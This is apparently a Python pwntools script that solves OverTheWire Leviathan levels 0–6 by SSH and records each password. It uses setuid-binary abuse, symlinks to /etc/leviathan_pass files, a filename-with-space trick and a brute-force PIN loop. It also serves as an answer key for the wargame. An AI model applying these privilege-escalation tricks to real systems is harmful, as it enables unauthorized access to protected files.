import base64
import paramiko

from pwn import *

host = 'leviathan.labs.overthewire.org'
port = 2223
context.log_level = 'warn'
p = log.progress('Solving level: ', level=30)
passwords = {0: 'leviathan0'}


def connectToLevel(level):
    return ssh('leviathan{}'.format(level), host=host, password=passwords[level], port=port)


def execute_command(shell, command):
    return shell[command].decode('utf-8')


def solve_one_command(level, command):
    shell = connectToLevel(level)
    passwords[level+1] = execute_command(shell, command)
    shell.close()


def solve_leviathan(level):
    match level:
        case 0:
            # Level 0
            p.status('0')
            passwords[1] = execute_command(connectToLevel(
                0), 'grep password .backup/bookmarks.html').split('the password for leviathan1 is')[1].split('"')[0].strip()
        case 1:
            # Level 1
            p.status('1')
            exe = connectToLevel(1).run('./check')
            exe.sendlineafter(b'password: ', b'sex')
            exe.sendlineafter(b'$ ', b'cat /etc/leviathan_pass/leviathan2')
            passwords[2] = exe.recvline().decode('utf-8').strip()
        case 2:
            # Level 2
            p.status('2')
            solve_one_command(
                2, 'cd $(mktemp -d) && chmod 777 . && ln -s /etc/leviathan_pass/leviathan3 pass && touch "pass test" && touch test && ~/printfile "pass test"')
        case 3:
            # Level 3
            p.status('3')
            exe = connectToLevel(3).run('./level3')
            exe.sendlineafter(b'Enter the password> ', b'snlprintf')
            exe.sendlineafter(b'$ ', b'cat /etc/leviathan_pass/leviathan4')
            passwords[4] = exe.recvline().decode('utf-8').strip()
        case 4:
            # Level 4
            p.status('4')
            binary = execute_command(connectToLevel(
                4), '.trash/bin').replace(' ', '')
            binary = int(binary, 2)
            passwords[5] = binascii.unhexlify(
                '%x' % binary).decode('utf-8').strip()
        case 5:
            # Level 5
            p.status('5')
            solve_one_command(
                5, 'ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log && ./leviathan5')
        case 6:
            # Level 6
            p.status('6')
            script = base64.b64encode("""
                    #!/bin/bash

                    password={}

                    for (( i=0; i<10000; i++ ))
                    do
                        ~/leviathan6 $i | grep -v -E Wrong
                    done
                    """.encode('utf-8')).decode('utf-8')
            exe = connectToLevel(6).run(
                'cd $(mktemp -d) && echo {} | base64 -d > script.sh && chmod +x script.sh && ./script.sh'.format(script))
            exe.sendline(b"cat /etc/leviathan_pass/leviathan7")
            passwords[7] = exe.recvline().decode('utf-8').strip()


# Append password to file
def write_password(level):
    passwords_file = open('leviathan_pass', 'a')
    passwords_file.write('leviathan{}:{}\n'.format(str(level), passwords[level]))
    passwords_file.close()

# Write first password
passwords_file = open('leviathan_pass', 'w')
passwords_file.write('leviathan0:{}\n'.format(passwords[0]))
passwords_file.close()

i = 0
while i < 7:
    try:
        solve_leviathan(i)
        write_password(i+1)
    except (ConnectionError, paramiko.ssh_exception.SSHException):
        print("Connection Error. Retrying...")
    else:
        i += 1

p.success('All levels solved')

# Show passwords
for level, password in passwords.items():
    print('leviathan{}:{}'.format(str(level), password))